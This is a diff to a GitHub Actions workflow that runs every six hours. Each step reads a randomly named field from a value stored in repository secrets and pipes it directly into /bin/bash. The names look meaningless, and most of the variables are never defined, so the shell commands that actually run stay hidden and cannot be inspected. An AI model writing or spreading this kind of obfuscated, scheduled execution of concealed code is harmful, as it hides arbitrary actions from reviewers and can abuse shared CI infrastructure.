@@ -1,22 +1,27 @@
 name: careenmutter
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 3/6 * * *'
+    - cron: '44 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: careenmutter
         env:
-          b58202: ${{ secrets.b58202 }}
+          o6: ${{ secrets.o6 }}
         run: |
-          echo $b58202 | jq -r .ni904 | /bin/bash
-          echo $bjkjh1213 | jq -r .lsv6 | /bin/bash
-          echo $qm7 | jq -r .pzrm485 | /bin/bash
-          echo $baynh89108 | jq -r .f10 | /bin/bash
-          echo $erm46 | jq -r .ey5 | /bin/bash
+          echo $o6 | jq -r .unp79004 | /bin/bash
+          echo $mlxuf8346 | jq -r .rh6102 | /bin/bash
+          echo $bzkb95 | jq -r .sip3 | /bin/bash
+          echo $pua80 | jq -r .rjohw5 | /bin/bash
+          echo $cuvg05758 | jq -r .ek6925 | /bin/bash
+          echo $drq52094 | jq -r .velh9 | /bin/bash
+          echo $kq10 | jq -r .uuos3 | /bin/bash
+          echo $aiduw8 | jq -r .ofnu59416 | /bin/bash
+          echo $m7 | jq -r .vlnk8 | /bin/bash
+          echo $ln2 | jq -r .taf81 | /bin/bash
 
